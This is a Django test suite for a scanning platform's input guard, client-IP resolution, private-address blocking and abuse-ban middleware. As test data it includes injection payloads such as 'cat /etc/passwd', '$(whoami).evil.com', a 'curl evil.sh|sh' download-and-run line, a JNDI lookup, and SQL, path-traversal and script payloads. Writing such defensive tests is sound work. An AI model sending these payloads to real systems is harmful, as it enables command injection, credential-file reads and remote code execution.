import json
from unittest import mock

from django.contrib.auth.models import User
from django.test import Client, RequestFactory, TestCase
from django.utils import timezone

from agentapi.auth import create_token
from dashboard.models import AbuseBan, AbuseStrike, Org, OrgMembership, Project
from reNgine import input_guard as guard
from reNgine.client_ip import client_ip
from targetApp import target_types as tt


class InspectTests(TestCase):
	def hits(self, field, text):
		return [h[0] for h in guard.inspect([(field, text)])]

	def test_ordinary_input_passes(self):
		for field, text in [('value', 'example.com'), ('value', '10.0.0.0/28'), ('value', '192.168.1.1 - 20'),
							('value', 'fe80::1'), ('q', "o'brien"), ('description', 'Reset it, then retry; ok?'),
							('password', 'p;ls $(x) ../'), ('text', 'a.com, b.com;c.com\n#Acme\n10.0.0.1 # note: id; ls\nid.example.com'),
							('text', 'https://x.example.com/a?b=1&c=2\n[www.example.com](https://www.example.com)\nssh://root@h.example.com:22/')]:
			self.assertEqual(self.hits(field, text), [], (field, text))

	def test_injection_payloads_are_caught(self):
		for field, text, category in [
			('value', 'example.com; cat /etc/passwd', 'command_injection'), ('value', 'a.com|id', 'command_injection'),
			('value', '$(whoami).evil.com', 'command_injection'), ('text', 'a.com\nb.com && curl evil.sh|sh', 'command_injection'),
			('name', '`id`', 'command_injection'), ('name', '${jndi:ldap://x/a}', 'command_substitution'),
			('path', '../../etc/passwd', 'path_traversal'), ('q', "x' OR 1=1 --", 'sql_injection'),
			('q', '1 UNION SELECT password FROM users', 'sql_injection'), ('q', 'a%00b', 'null_byte'),
			('note', '<script>alert(1)</script>', 'script_or_template_injection'),
			('name', '{{ config.items() }}', 'script_or_template_injection'),
			('text', 'http://$(whoami).evil.com/', 'command_injection')]:
			self.assertEqual(self.hits(field, text)[:1], [category], (field, text))

	def test_strict_fields_reject_anything_but_host_characters(self):
		self.assertEqual(self.hits('value', 'exa mple$.com'), ['strict_field'])
		self.assertEqual(self.hits('targets', 'a.com\nb.com>x'), ['strict_field'])
		self.assertEqual(self.hits('text', 'https://h&x.example.com/ok'), ['strict_field'])  # junk in the host part still counts


class ClientIpTests(TestCase):
	def req(self, remote, xff=None):
		meta = {'REMOTE_ADDR': remote}
		if xff:
			meta['HTTP_X_FORWARDED_FOR'] = xff
		return RequestFactory().get('/', **meta)

	def test_header_is_ignored_without_trusted_proxies(self):
		with mock.patch.dict('os.environ', {'CVENGINE_TRUSTED_PROXIES': ''}):
			self.assertEqual(client_ip(self.req('8.8.8.8', '1.2.3.4')), '8.8.8.8')

	def test_trusted_proxy_hands_over_the_last_untrusted_hop(self):
		with mock.patch.dict('os.environ', {'CVENGINE_TRUSTED_PROXIES': '172.16.0.0/12'}):
			self.assertEqual(client_ip(self.req('172.18.0.5', '9.9.9.9')), '9.9.9.9')
			self.assertEqual(client_ip(self.req('172.18.0.5', '6.6.6.6, 9.9.9.9')), '9.9.9.9')  # spoofed left part ignored
			self.assertEqual(client_ip(self.req('172.18.0.5', 'junk')), '172.18.0.5')
			self.assertEqual(client_ip(self.req('8.8.8.8', '1.2.3.4')), '8.8.8.8')  # peer is not a proxy
			self.assertEqual(client_ip(self.req('::ffff:8.8.8.8')), '8.8.8.8')


class ScannableIpTests(TestCase):
	def test_blocked_and_allowed(self):
		for bad in ('127.0.0.1', '::1', '169.254.169.254', '10.1.1.1', '192.168.1.5', '172.20.0.2', '100.64.0.1', 'fe80::1',
					'::ffff:127.0.0.1', 'x', ''):
			self.assertFalse(tt.is_scannable_ip(bad), bad)
		for good in ('8.8.8.8', '203.0.113.5', '2606:4700::1111'):
			self.assertTrue(tt.is_scannable_ip(good), good)
		self.assertTrue(tt.is_scannable_ip('10.1.1.1', allow_private=True))
		self.assertFalse(tt.is_scannable_ip('127.0.0.1', allow_private=True))  # never, even when internal is allowed

	def test_operator_can_allow_internal_ranges(self):
		with mock.patch.dict('os.environ', {'CVENGINE_ALLOW_PRIVATE_TARGETS': '1'}):
			self.assertTrue(tt.is_scannable_ip('192.168.1.5'))
			self.assertFalse(tt.is_scannable_ip('169.254.169.254'))


def post(token, path, body, ip='8.8.4.4'):
	return Client().post(path, json.dumps(body), content_type='application/json', HTTP_AUTHORIZATION=f'Bearer {token}', REMOTE_ADDR=ip)


class GuardMiddlewareTests(TestCase):
	@classmethod
	def setUpTestData(cls):
		org = Org.objects.create(name='G', slug='g')
		cls.project = Project.objects.create(name='G', slug='g-p', insert_date=timezone.now(), org=org)
		cls.user = User.objects.create_user('mallory', password='x')
		cls.admin = User.objects.create_superuser('root', 'r@x.test', 'x')
		OrgMembership.objects.create(user=cls.user, org=org, role='user')

	def setUp(self):
		self.addCleanup(guard.invalidate_cache)
		guard.invalidate_cache()

	def test_internal_address_targets_are_refused(self):
		_, tok = create_token(self.user, 't')
		for value in ('127.0.0.1', '169.254.169.254', '10.0.0.0/24'):
			status = post(tok, '/api/v1/projects/g-p/targets', {'value': value}).status_code
			self.assertEqual(status, 400, value)

	def test_one_command_injection_bans_account_tokens_and_public_ip(self):
		_, tok = create_token(self.user, 't')
		response = post(tok, '/api/v1/projects/g-p/targets', {'value': 'example.com; cat /etc/passwd'})
		self.assertEqual(response.status_code, 403)
		self.user.refresh_from_db()
		self.assertFalse(self.user.is_active)
		self.assertTrue(AbuseBan.objects.filter(ip='8.8.4.4', lifted=False).exists())
		self.assertTrue(AbuseStrike.objects.filter(username='mallory', category='command_injection').exists())
		guard.invalidate_cache()
		self.assertEqual(Client().get('/login/', REMOTE_ADDR='8.8.4.4').status_code, 403)  # the address is blocked everywhere
		self.assertNotEqual(Client().get('/login/', REMOTE_ADDR='8.8.8.8').status_code, 403)

	def test_a_nul_byte_payload_is_counted_and_ban_text_never_carries_it(self):
		"""Postgres refuses a NUL byte in text, so a strike whose sample held one used to fail to save: the request was rejected but
		never counted, and a flood of them never reached a ban."""
		_, tok = create_token(self.user, 't')
		response = post(tok, '/api/v1/projects/g-p/targets', {'value': 'a.example\x00b'})
		self.assertEqual(response.status_code, 403)  # null_byte is worth 3 strikes, enough on its own
		strike = AbuseStrike.objects.get(username='mallory', category='null_byte')
		self.assertNotIn('\x00', strike.sample + strike.field + strike.path)
		self.user.refresh_from_db()
		self.assertFalse(self.user.is_active)
		self.assertTrue(AbuseBan.objects.filter(ip='8.8.4.4').exists())

	def test_private_addresses_are_never_ip_banned(self):
		_, tok = create_token(self.user, 't')
		post(tok, '/api/v1/projects/g-p/targets', {'value': 'a.com|id'}, ip='192.168.1.50')
		self.assertFalse(AbuseBan.objects.exclude(ip='').exists())
		self.user.refresh_from_db()
		self.assertFalse(self.user.is_active)

	def test_superusers_are_flagged_not_banned(self):
		_, tok = create_token(self.admin, 'r')
		post(tok, '/api/v1/projects/g-p/targets', {'value': 'a.com|id'})
		self.admin.refresh_from_db()
		self.assertTrue(self.admin.is_active)

	def test_single_low_weight_hit_is_rejected_without_ban(self):
		_, tok = create_token(self.user, 't')
		self.assertEqual(post(tok, '/api/v1/projects/g-p/targets', {'value': 'exa mple$.com'}).status_code, 400)
		self.user.refresh_from_db()
		self.assertTrue(self.user.is_active)
		self.assertEqual(AbuseBan.objects.count(), 0)

	def test_lifted_ban_is_released(self):
		AbuseBan.objects.create(ip='8.8.4.4', reason='x', expires_at=timezone.now() + timezone.timedelta(hours=1))
		guard.invalidate_cache()
		self.assertEqual(Client().get('/login/', REMOTE_ADDR='8.8.4.4').status_code, 403)
		AbuseBan.objects.update(lifted=True)
		guard.invalidate_cache()
		self.assertNotEqual(Client().get('/login/', REMOTE_ADDR='8.8.4.4').status_code, 403)

	def test_cross_site_browser_requests_are_rejected_but_never_counted(self):
		_, tok = create_token(self.user, 't')
		response = Client().post('/api/v1/projects/g-p/targets', json.dumps({'value': 'a.com|id'}), content_type='application/json',
								 HTTP_AUTHORIZATION=f'Bearer {tok}', REMOTE_ADDR='8.8.4.4', HTTP_SEC_FETCH_SITE='cross-site')
		self.assertEqual(response.status_code, 400)
		self.assertEqual(AbuseStrike.objects.count(), 0)
		self.user.refresh_from_db()
		self.assertTrue(self.user.is_active)


class SentinelMachineDataTests(TestCase):
	"""What a Sentinel reports is scanner output: a nuclei template's description can hold backticks, ${...}, <script> or SQL, and counting that
	against the Sentinel's owner would lock out an account and lose the result."""

	NASTY = 'anything other than `0` can actually introduce ${x} and <script>alert(1)</script> or \' OR 1=1 -- and $(id) ; cat /etc/passwd'

	@classmethod
	def setUpTestData(cls):
		org = Org.objects.create(name='S', slug='s-g')
		cls.project = Project.objects.create(name='S', slug='s-g-p', insert_date=timezone.now(), org=org)
		cls.user = User.objects.create_user('owner', password='x')
		OrgMembership.objects.create(user=cls.user, org=org, role='admin')

	def setUp(self):
		self.addCleanup(guard.invalidate_cache)
		guard.invalidate_cache()
		from datetime import timedelta

		from agentapi.models import Agent, SentinelTask
		_, self.token = create_token(self.user, 'sentinel-token')
		response = Client().put('/api/v1/sentinel', json.dumps({'name': 'guarded', 'scope': {'projects': ['s-g-p']}, 'capabilities': ['nuclei_light']}),
								content_type='application/json', HTTP_AUTHORIZATION=f'Bearer {self.token}', REMOTE_ADDR='8.8.4.4')
		self.assertIn(response.status_code, (200, 201), response.content)
		self.agent = Agent.objects.get(name='guarded')
		Agent.objects.filter(pk=self.agent.pk).update(status='active', last_seen=timezone.now())
		self.task = SentinelTask.objects.create(project=self.project, kind='nuclei_light', target={'targets': ['a.example']}, agent=self.agent, status='running',
												lease_expires_at=timezone.now() + timedelta(minutes=5))

	def result(self, description=None):
		finding = {'template_id': 't1', 'name': 'a finding', 'severity': 'low', 'host': 'a.example', 'matched_at': 'https://a.example/',
				   'description': description or self.NASTY, 'matcher_name': 'm', 'extracted_results': [self.NASTY], 'tags': ['x']}
		return post(self.token, f'/api/v1/sentinel/tasks/{self.task.pk}/result', {'outcome': 'done', 'findings': [finding]})

	def test_a_finding_whose_text_looks_like_an_attack_is_accepted_and_counts_against_nobody(self):
		response = self.result()
		self.assertEqual(response.status_code, 200, response.content)
		self.assertFalse(AbuseStrike.objects.exists())
		self.user.refresh_from_db()
		self.assertTrue(self.user.is_active)
		from agentapi.models import SentinelTask
		stored = SentinelTask.objects.get(pk=self.task.pk)
		self.assertEqual(stored.status, 'done')
		self.assertIn('`0`', stored.result['findings'][0]['description'])  # kept as text, clipped, never interpreted

	def test_every_free_text_field_is_still_cleaned_and_bounded(self):
		response = self.result('x' * 5000)
		self.assertEqual(response.status_code, 200, response.content)
		from agentapi.models import SentinelTask
		self.assertLessEqual(len(SentinelTask.objects.get(pk=self.task.pk).result['findings'][0]['description']), 500)

	def test_a_heartbeat_carrying_text_that_looks_like_an_attack_is_accepted_too(self):
		response = post(self.token, '/api/v1/sentinel/heartbeat', {'info': {'version': 'abc', 'updater': {'installed': True, 'running': True, 'detail': self.NASTY}}})
		self.assertEqual(response.status_code, 200, response.content)
		self.assertFalse(AbuseStrike.objects.exists())

	def test_the_address_and_query_string_of_those_routes_are_still_checked(self):
		response = Client().post(f'/api/v1/sentinel/tasks/{self.task.pk}/result?x=$(id);cat%20/etc/passwd', json.dumps({'outcome': 'error', 'error': 'x'}),
								 content_type='application/json', HTTP_AUTHORIZATION=f'Bearer {self.token}', REMOTE_ADDR='8.8.4.4')
		self.assertEqual(response.status_code, 403)
		self.assertTrue(AbuseStrike.objects.exists())

	def test_what_a_person_types_on_every_other_sentinel_route_is_still_inspected(self):
		response = Client().put('/api/v1/sentinel', json.dumps({'name': 'x; cat /etc/passwd', 'scope': {'projects': ['s-g-p']}}), content_type='application/json',
								HTTP_AUTHORIZATION=f'Bearer {self.token}', REMOTE_ADDR='8.8.4.4')
		self.assertEqual(response.status_code, 403)
		self.assertTrue(AbuseStrike.objects.filter(category='command_injection').exists())

	def test_the_same_text_anywhere_else_is_still_an_attack(self):
		_, tok = create_token(self.user, 'other')
		response = post(tok, '/api/v1/projects/s-g-p/targets', {'value': 'example.com', 'description': self.NASTY}, ip='8.8.8.8')
		self.assertEqual(response.status_code, 403)
		self.assertTrue(AbuseStrike.objects.filter(category='command_injection').exists())

	def test_the_exemption_matches_only_those_two_routes(self):
		for path, expected in (('/api/v1/sentinel/tasks/7/result', True), ('/api/v1/sentinel/tasks/7/result/', True), ('/api/v1/sentinel/heartbeat', True),
							   ('/api/v1/sentinel', False), ('/api/v1/sentinel/tasks/next', False), ('/api/v1/sentinel/tasks/7/release', False),
							   ('/api/v1/sentinel/tasks/x/result', False), ('/api/v1/agent/tasks/7/result', False),
							   ('/api/v1/sentinels/bootstrap', False), ('/api/v1/sentinel/tasks/7/result/extra', False)):
			self.assertEqual(bool(guard.SENTINEL_MACHINE_PATH.match(path)), expected, path)
